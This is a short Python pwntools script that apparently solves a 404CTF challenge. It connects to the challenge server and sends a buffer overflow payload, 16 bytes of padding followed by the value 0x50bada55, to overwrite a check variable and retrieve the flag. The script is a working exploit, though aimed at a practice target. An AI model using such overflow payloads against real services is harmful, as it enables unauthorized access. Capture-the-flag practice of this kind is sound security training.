from pwn import *
# Establish the connection to the vulnerable C program
#io = process(['./wasmtime', 'main.wasm'])

io = remote("challenges.404ctf.fr", 30274)

# Craft the payload to set *check to 0x50bada55
payload = b'A' * 16  + p32(0x50bada55) + b"C" *3

print(io.recvline())
# Send the payload to the program
io.sendline(payload)

# Receive and print the program's output
output = io.recvline()
print(output)

if (b"Apparemment non" not in output):
	output = io.recvall()
	print("Flag :", output.decode())

# Close the connection
io.close()